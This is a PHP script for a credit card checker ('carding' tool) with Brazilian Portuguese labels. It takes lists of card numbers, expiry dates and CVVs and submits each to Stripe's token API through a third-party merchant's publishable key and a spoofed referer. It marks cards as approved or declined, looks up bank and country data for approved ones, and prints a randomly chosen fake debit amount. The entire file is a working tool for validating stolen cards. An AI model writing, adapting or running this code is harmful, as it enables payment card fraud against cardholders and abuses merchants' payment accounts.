<?php

set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];

testar($cc,$mes,$ano,$cvv);

function getStr($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}

function testar($cc, $mes, $ano, $cvv){
            $curl = curl_init();  
            curl_setopt($curl, CURLOPT_URL, "https://api.stripe.com/v1/tokens");
            $User_Agent = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0';
            $request_headers = array();
            $request_headers[] = 'Host: api.stripe.com';
            $request_headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0';
            $request_headers[] = 'Accept: application/x-www-form-urlencoded';
            $request_headers[] = 'Referer: https://js.stripe.com/v2/channel.html?stripe_xdm_e=https%3A%2F%2Fauth.jacobinmag.com&stripe_xdm_c=default472515&stripe_xdm_p=1';
            curl_setopt($curl, CURLOPT_HTTPHEADER, $request_headers);
            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 0);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($curl, CURLOPT_POST, 1);
            curl_setopt($curl, CURLOPT_POSTFIELDS, "time_on_page=1186150&pasted_fields=number&guid=NA&muid=e7ad28d5-6692-43a2-9340-003f54eb78de&sid=44ca59f3-2bc5-43d7-a341-d85ce323aa36&key=pk_J0TsVupJvxyOdvazthCR63TkbhsVm&payment_user_agent=stripe.js%2F604c5e8&card[name]=Diego+Ian+Martins&card[number]=$cc&card[exp_month]=$mes&card[exp_year]=$ano");
        
            $dados = curl_exec($curl);

            $cbin = substr($cc, 0,1);
            if($cbin == "5"){
            $cbin = "fa fa-cc-mastercard";
            }else if($cbin == "4"){
            $cbin = "fa fa-cc-visa";
            }else if($cbin == "3"){
            $cbin = "fa fa-cc-amex";
            }
            $valores = array('R$ 1,00','R$ 5,00','R$ 1,40','R$ 4,80','R$ 2,00','R$ 7,00','R$ 10,00','R$ 3,00','R$ 3,40','R$ 5,50');
            $debitouu = $valores[mt_rand(0,9)];

             if (strpos($dados, 'Your card was declined.')) { 
                
               echo '<span class="label label-danger">#Reprovada ❌ '. $cc . ' | ' . $mes . ' | ' . $ano . ' | ' . $cvv . ' #SH4DOWD3V-SH3CK3<br></span>';

              }else if (strpos($dados, "Your card's security code is incorrect.")){
              
                echo '<span class="label label-danger">#Reprovada - Bloqueado ❌ '. $cc .' | '. $mes .' | ' . $ano . ' |' . $cvv.' #SH4DOWD3V-SH3CK3<br></span>';

              }else{
                 $bin = substr($cc, 0,6);
                $binn = substr($cc, 0,6);

                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://www.cardbinlist.com/search.html?bin='.$bin);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                $bin = curl_exec($ch);
                $level     = trim(strip_tags(getstr($bin,'Card Sub Brand</th>','</td>')));
                curl_close($ch);
            
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$binn);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                $bin = curl_exec($ch);
                curl_close($ch);
                $data = date("d/m/Y H:i:s");
                $pais = trim(strip_tags(getstr($bin,'country":{"alpha2":"','"')));
                $banco     = trim(strip_tags(getstr($bin,'"bank":{"name":"','"')));
                $brand     = trim(strip_tags(getstr($bin,'"scheme":"','"')));
                $fone = trim(strip_tags(getstr($bin,'"phone":"','"')));
                $tipo = trim(strip_tags(getstr($bin,'},"type":"','"')));
                $latitude = trim(strip_tags(getstr($bin,'latitude":',',')));
                $logitude = trim(strip_tags(getstr($bin,'longitude":','}}')));
                $prepago = trim(strip_tags(getstr($bin,'"prepaid":',',')));
                $valores = array('R$ 1,00','R$ 5,00','R$ 1,40','R$ 4,80','R$ 2,00','R$ 7,00','R$ 10,00','R$ 3,00','R$ 3,40','R$ 5,50');
                $debitouu = $valores[mt_rand(0,9)];
                echo '<span class="label label-success">#Aprovada ✅ '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' #SH4DOWD3V-SH3CK3 | Informaçoes | BIN: '.$binn.' | PAIS: '.$pais.' | BANCO: '.$banco.' | BANDEIRA: '.$brand.' | NIVEL: '.$level.' | PRÉ-PAGO : '.$prepago.' | <br>PHONE : '.$fone.' | TIPO : '.$tipo.' | LATITUDE : '.$latitude.' | LONGITUDE : '.$logitude.' | GERADA 💳 | DATA: '.$data.' | GATE [GR] | DEBITOU: '.$debitouu.'</span> <br>';
                  
             }
          
           

 }


?>
